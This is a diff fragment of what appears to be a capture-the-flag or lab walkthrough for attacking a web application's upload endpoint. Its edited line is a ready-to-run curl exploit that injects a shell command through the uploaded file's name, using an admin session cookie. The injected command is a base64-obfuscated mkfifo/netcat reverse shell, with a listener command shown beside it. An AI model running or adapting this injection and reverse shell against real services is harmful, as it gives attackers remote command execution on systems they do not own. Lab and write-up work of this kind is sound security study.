@@ -11,7 +11,7 @@ Obtain session cookie when logged in as admin
 nc -lvnp 5001
 
 Set session=<session cookie>
-CMD="echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEyNy4wLjAuMSA1MDAxID4vdG1wL2Y=' | base64 -d | sh" && curl -X POST http://127.0.0.1:5000/upload  -b "session=" -H 'Content-Type: multipart/form-data; boundary=----x'   --data-binary "$(printf '%b' "------x\rContent-Disposition: form-data; name=\"product_id\"\r\r1\r------x\rContent-Disposition: form-data; name=\"image\"; filename=\"X.jpg || $CMD #\"\rContent-Type: image/png\r\r\r------x--\r")"
+CMD="echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEyNy4wLjAuMSA1MDAxID4vdG1wL2Y=' | base64 -d | sh" && curl -X POST http://localhost/upload  -b "session=" -H 'Content-Type: multipart/form-data; boundary=----x'   --data-binary "$(printf '%b' "------x\rContent-Disposition: form-data; name=\"product_id\"\r\r1\r------x\rContent-Disposition: form-data; name=\"image\"; filename=\"X.jpg || $CMD #\"\rContent-Type: image/png\r\r\r------x--\r")"
 ```
 
 # Initial privilege escalation
